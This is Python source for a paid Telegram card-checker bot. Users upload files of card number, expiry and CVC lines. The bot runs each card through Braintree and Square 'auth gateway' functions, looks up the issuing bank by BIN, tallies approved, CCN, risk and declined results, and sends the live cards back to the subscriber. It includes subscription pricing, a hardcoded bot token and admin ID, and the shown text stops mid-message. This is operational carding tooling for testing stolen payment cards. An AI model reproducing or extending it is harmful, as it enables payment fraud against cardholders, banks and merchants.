import telebot,os
import re,json
import requests
import telebot,time,random
import random
import string
from telebot import types
from gatet import *
from reg import reg
from datetime import datetime, timedelta
from multiprocessing import Process
import threading
from bs4 import BeautifulSoup
stopuser = {}
token = '7421471585:AAGt3sYBp_T70gzKU7snwFmTQpf6EZxxxLA'
bot=telebot.TeleBot(token,parse_mode="HTML")
admin = 5089141183
command_usage = {}
def reset_command_usage():
	for user_id in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}	
@bot.message_handler(commands=["start"])
def start(message):
	def my_function():
		gate=''
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
		if BL == '𝗙𝗥𝗘𝗘':	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/GNA_I")
			keyboard.add(contact_button)
			random_number = random.randint(33, 82)
			photo_url = f'https://t.me/jdhdhhsjejeeheh/{random_number}'
			bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
𝑻𝑯𝑰𝑺 𝑷𝑨𝑹𝑻𝑰𝑪𝑼𝑳𝑨𝑹 𝑩𝑶𝑻 𝑰𝑺 𝑵𝑶𝑻 𝑭𝑹𝑬𝑬 
𝑰𝑭 𝒀𝑶𝑼 𝑾𝑨𝑵𝑻 𝑻𝑶 𝑼𝑺𝑬 𝑰𝑻, 𝒀𝑶𝑼 𝑴𝑼𝑺𝑻 𝑷𝑼𝑹𝑪𝑯𝑨𝑺𝑬 𝑨 𝑾𝑬𝑬𝑲𝑳𝒀 𝑶𝑹 𝑴𝑶𝑵𝑻𝑯𝑳𝒀 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 

𝑻𝑯𝑬 𝑩𝑶𝑻'𝑺 𝑱𝑶𝑩 𝑰𝑺 𝑻𝑶 𝑪𝑯𝑬𝑪𝑲 𝑪𝑨𝑹𝑫𝑺

𝑩𝑶𝑻 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝑷𝑹𝑰𝑪𝑬𝑺:
 
𝑬𝑮𝒀𝑷𝑻 
1 DAY > 50𝑬G
1 𝑾𝑬𝑬𝑲 > 150𝑬𝑮
1 𝑴𝑶𝑵𝑻𝑯 > 450𝑬𝑮

𝑰𝑹𝑨𝑸 
1 DAY  ➜ 1 𝑨𝑺𝑰𝑨
1 𝑾𝑬𝑬𝑲 ➜  3 𝑨𝑺𝑰𝑨 
1 𝑴𝑶𝑵𝑻𝑯 ➜  10 𝑨𝑺𝑰𝑨

𝑾𝑶𝑹𝑳𝑫𝑾𝑰𝑫𝑬 ➜  𝑼𝑺𝑫𝑻 
1 DAY  ➜  1$
1 𝑾𝑬𝑬𝑲 ➜  3$ 
1 𝑴𝑶𝑵𝑻𝑯 ➜  10$

𝑪𝑳𝑰𝑪𝑲 /𝑪𝑴𝑫𝑺 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗝𝗢𝗜𝗡 ✨", url="https://t.me/GNA_I")
		keyboard.add(contact_button)
		username = message.from_user.first_name
		random_number = random.randint(33, 82)
		photo_url = f'https://t.me/jdhdhhsjejeeheh/{random_number}'
		bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption='''𝘾𝙡𝙞𝙘𝙠 /cmds 𝙏𝙤 𝙑𝙞𝙚𝙬 𝙏𝙝𝙚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙊𝙧 𝙎𝙚𝙣𝙙 𝙏𝙝𝙚 𝙁𝙞𝙡𝙚 𝘼𝙣𝙙 𝙄 𝙒𝙞𝙡𝙡 𝘾𝙝𝙚𝙘𝙠 𝙄𝙩''',reply_markup=keyboard)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["cmds"])
def start(message):
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	id=message.from_user.id
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='𝗙𝗥𝗘𝗘'
	name = message.from_user.first_name
	keyboard = types.InlineKeyboardMarkup()
	contact_button = types.InlineKeyboardButton(text=f"✨ {BL}  ✨",callback_data='plan')
	keyboard.add(contact_button)
	bot.send_message(chat_id=message.chat.id, text=f'''<b> 
𝗧𝗵𝗲𝘀𝗲 𝗔𝗿𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁'𝗦 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀

𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵 <code>/chk </code> 𝗻𝘂𝗺𝗯𝗲𝗿|𝗺𝗺|𝘆𝘆|𝗰𝘃𝗰
𝗦𝗧𝗔𝗧𝗨𝗦 𝗢𝗡𝗟𝗜𝗡𝗘 

𝟯𝗗 𝗟𝗢𝗢𝗞𝗨𝗣 <code>/vbv </code> 𝗻𝘂𝗺𝗯𝗲𝗿|𝗺𝗺|𝘆𝘆|𝗰𝘃𝗰
𝗢𝗡𝗟𝗜𝗡𝗘

𝗪𝗲 𝗪𝗶𝗹𝗹 𝗕𝗲 𝗔𝗱𝗱𝗶𝗻𝗴 𝗦𝗼𝗺𝗲 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 𝗔𝗻𝗱 𝗧𝗼𝗼𝗹𝘀 𝗦𝗼𝗼𝗻</b>
''',reply_markup=keyboard)
@bot.message_handler(content_types=["document"])
def main(message):
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
		if BL == '𝗙𝗥𝗘𝗘':
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/GNA_I")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
𝑻𝑯𝑰𝑺 𝑷𝑨𝑹𝑻𝑰𝑪𝑼𝑳𝑨𝑹 𝑩𝑶𝑻 𝑰𝑺 𝑵𝑶𝑻 𝑭𝑹𝑬𝑬 
𝑰𝑭 𝒀𝑶𝑼 𝑾𝑨𝑵𝑻 𝑻𝑶 𝑼𝑺𝑬 𝑰𝑻, 𝒀𝑶𝑼 𝑴𝑼𝑺𝑻 𝑷𝑼𝑹𝑪𝑯𝑨𝑺𝑬 𝑨 𝑾𝑬𝑬𝑲𝑳𝒀 𝑶𝑹 𝑴𝑶𝑵𝑻𝑯𝑳𝒀 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 

𝑻𝑯𝑬 𝑩𝑶𝑻'𝑺 𝑱𝑶𝑩 𝑰𝑺 𝑻𝑶 𝑪𝑯𝑬𝑪𝑲 𝑪𝑨𝑹𝑫𝑺

𝑩𝑶𝑻 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝑷𝑹𝑰𝑪𝑬𝑺:
 
𝑬𝑮𝒀𝑷𝑻 
1 DAY > 50𝑬G
1 𝑾𝑬𝑬𝑲 > 150𝑬𝑮
1 𝑴𝑶𝑵𝑻𝑯 > 450𝑬𝑮

𝑰𝑹𝑨𝑸 
1 DAY  ➜ 1 𝑨𝑺𝑰𝑨
1 𝑾𝑬𝑬𝑲 ➜  3 𝑨𝑺𝑰𝑨 
1 𝑴𝑶𝑵𝑻𝑯 ➜  10 𝑨𝑺𝑰𝑨

𝑾𝑶𝑹𝑳𝑫𝑾𝑰𝑫𝑬 ➜  𝑼𝑺𝑫𝑻 
1 DAY  ➜  1$
1 𝑾𝑬𝑬𝑲 ➜  3$ 
1 𝑴𝑶𝑵𝑻𝑯 ➜  10$

𝑪𝑳𝑰𝑪𝑲 /𝑪𝑴𝑫𝑺 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
			return
		with open('data.json', 'r') as file:
			json_data = json.load(file)
			date_str=json_data[str(id)]['timer'].split('.')[0]
		try:
			provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		except Exception as e:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/GNA_I")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
𝑻𝑯𝑰𝑺 𝑷𝑨𝑹𝑻𝑰𝑪𝑼𝑳𝑨𝑹 𝑩𝑶𝑻 𝑰𝑺 𝑵𝑶𝑻 𝑭𝑹𝑬𝑬 
𝑰𝑭 𝒀𝑶𝑼 𝑾𝑨𝑵𝑻 𝑻𝑶 𝑼𝑺𝑬 𝑰𝑻, 𝒀𝑶𝑼 𝑴𝑼𝑺𝑻 𝑷𝑼𝑹𝑪𝑯𝑨𝑺𝑬 𝑨 𝑾𝑬𝑬𝑲𝑳𝒀 𝑶𝑹 𝑴𝑶𝑵𝑻𝑯𝑳𝒀 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 

𝑻𝑯𝑬 𝑩𝑶𝑻'𝑺 𝑱𝑶𝑩 𝑰𝑺 𝑻𝑶 𝑪𝑯𝑬𝑪𝑲 𝑪𝑨𝑹𝑫𝑺

𝑩𝑶𝑻 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝑷𝑹𝑰𝑪𝑬𝑺:
 
𝑬𝑮𝒀𝑷𝑻 
1 DAY > 50𝑬G
1 𝑾𝑬𝑬𝑲 > 150𝑬𝑮
1 𝑴𝑶𝑵𝑻𝑯 > 450𝑬𝑮

𝑰𝑹𝑨𝑸 
1 DAY  ➜ 1 𝑨𝑺𝑰𝑨
1 𝑾𝑬𝑬𝑲 ➜  3 𝑨𝑺𝑰𝑨 
1 𝑴𝑶𝑵𝑻𝑯 ➜  10 𝑨𝑺𝑰𝑨

𝑾𝑶𝑹𝑳𝑫𝑾𝑰𝑫𝑬 ➜  𝑼𝑺𝑫𝑻 
1 DAY  ➜  1$
1 𝑾𝑬𝑬𝑲 ➜  3$ 
1 𝑴𝑶𝑵𝑻𝑯 ➜  10$

𝑪𝑳𝑰𝑪𝑲 /𝑪𝑴𝑫𝑺 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
			return
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/GNA_I")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
		''',reply_markup=keyboard)
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text=f"🏴‍☠️ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 🏴‍☠️",callback_data='br')
		sw = types.InlineKeyboardButton(text=f" 𝗦𝗤𝗨𝗔𝗥𝗘 𝗔𝗨𝗧𝗛 🪽",callback_data='sq')
		keyboard.add(contact_button)
		keyboard.add(sw)
		bot.reply_to(message, text=f'𝘾𝙝𝙤𝙤𝙨𝙚 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩 𝙏𝙤 𝙐𝙨𝙚',reply_markup=keyboard)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open("combo.txt", "wb") as w:
			w.write(ee)
@bot.callback_query_handler(func=lambda call: call.data == 'br')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='𝘽𝙧𝙖𝙞𝙣𝙩𝙧𝙚𝙚 𝘼𝙪𝙩𝙝'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for pp in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➲ @GNA_I')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+pp[:6]).json()
						
					except:
						pass
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(Tele(pp))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {pp} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝙍𝙄𝙎𝙆 🏴‍☠️ ➜ [ {riskk} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 🔥 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @GNA_I''', reply_markup=mes)
					
					msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{pp}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {card_type} - {brand}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝘽𝙞𝙣 ➼ {pp[:6]}
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @GNA_I</b>'''
					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
					elif 'CVV' in last:
						ccnn+=1
					else:
						dd += 1
					time.sleep(4)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➲ @GNA_I')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.callback_query_handler(func=lambda call: call.data == 'sq')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='𝗦𝗤𝗨𝗔𝗥𝗘 𝗔𝗨𝗧𝗛'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for pp in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➲ @GNA_I')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+pp[:6]).json()
						
					except:
						pass
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(sq(pp))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {pp} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝙍𝙄𝙎𝙆 🏴‍☠️ ➜ [ {riskk} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 🔥 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @GNA_I''', reply_markup=mes)
					
					msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{pp}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {card_type} - {brand}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝘽𝙞𝙣 ➼ {pp[:6]}
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @GNA_I</b>'''
					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
					elif 'CVV' in last:
						ccnn+=1
					else:
						dd += 1
					time.sleep(20)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➲ @GNA_I')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def respond_to_vbv(message):
	gate='𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 '
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/GNA_I")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
𝑻𝑯𝑰𝑺 𝑷𝑨𝑹𝑻𝑰𝑪𝑼𝑳𝑨𝑹 𝑩𝑶𝑻 𝑰𝑺 𝑵𝑶𝑻 𝑭𝑹𝑬𝑬 
𝑰𝑭 𝒀𝑶𝑼 𝑾𝑨𝑵𝑻 𝑻𝑶 𝑼𝑺𝑬 𝑰𝑻, 𝒀𝑶𝑼 𝑴𝑼𝑺𝑻 𝑷𝑼𝑹𝑪𝑯𝑨𝑺𝑬 𝑨 𝑾𝑬𝑬𝑲𝑳𝒀 𝑶𝑹 𝑴𝑶𝑵𝑻𝑯𝑳𝒀 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 

𝑻𝑯𝑬 𝑩𝑶𝑻'𝑺 𝑱𝑶𝑩 𝑰𝑺 𝑻𝑶 𝑪𝑯𝑬𝑪𝑲 𝑪𝑨𝑹𝑫𝑺

𝑩𝑶𝑻 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝑷𝑹𝑰𝑪𝑬𝑺:
 
𝑬𝑮𝒀𝑷𝑻 
1 DAY > 50𝑬G
1 𝑾𝑬𝑬𝑲 > 150𝑬𝑮
1 𝑴𝑶𝑵𝑻𝑯 > 450𝑬𝑮

𝑰𝑹𝑨𝑸 
1 DAY  ➜ 1 𝑨𝑺𝑰𝑨
1 𝑾𝑬𝑬𝑲 ➜  3 𝑨𝑺𝑰𝑨 
1 𝑴𝑶𝑵𝑻𝑯 ➜  10 𝑨𝑺𝑰𝑨

𝑾𝑶𝑹𝑳𝑫𝑾𝑰𝑫𝑬 ➜  𝑼𝑺𝑫𝑻 
1 DAY  ➜  1$
1 𝑾𝑬𝑬𝑲 ➜  3$ 
1 𝑴𝑶𝑵𝑻𝑯 ➜  10$

𝑪𝑳𝑰𝑪𝑲 /𝑪𝑴𝑫𝑺 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/GNA_I")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
𝑻𝑯𝑰𝑺 𝑷𝑨𝑹𝑻𝑰𝑪𝑼𝑳𝑨𝑹 𝑩𝑶𝑻 𝑰𝑺 𝑵𝑶𝑻 𝑭𝑹𝑬𝑬 
𝑰𝑭 𝒀𝑶𝑼 𝑾𝑨𝑵𝑻 𝑻𝑶 𝑼𝑺𝑬 𝑰𝑻, 𝒀𝑶𝑼 𝑴𝑼𝑺𝑻 𝑷𝑼𝑹𝑪𝑯𝑨𝑺𝑬 𝑨 𝑾𝑬𝑬𝑲𝑳𝒀 𝑶𝑹 𝑴𝑶𝑵𝑻𝑯𝑳𝒀 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 

𝑻𝑯𝑬 𝑩𝑶𝑻'𝑺 𝑱𝑶𝑩 𝑰𝑺 𝑻𝑶 𝑪𝑯𝑬𝑪𝑲 𝑪𝑨𝑹𝑫𝑺

𝑩𝑶𝑻 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝑷𝑹𝑰𝑪𝑬𝑺:
 
𝑬𝑮𝒀𝑷𝑻 
1 DAY > 50𝑬G
1 𝑾𝑬𝑬𝑲 > 150𝑬𝑮
1 𝑴𝑶𝑵𝑻𝑯 > 450𝑬𝑮

𝑰𝑹𝑨𝑸 
1 DAY  ➜ 1 𝑨𝑺𝑰𝑨
1 𝑾𝑬𝑬𝑲 ➜  3 𝑨𝑺𝑰𝑨 
1 𝑴𝑶𝑵𝑻𝑯 ➜  10 𝑨𝑺𝑰𝑨

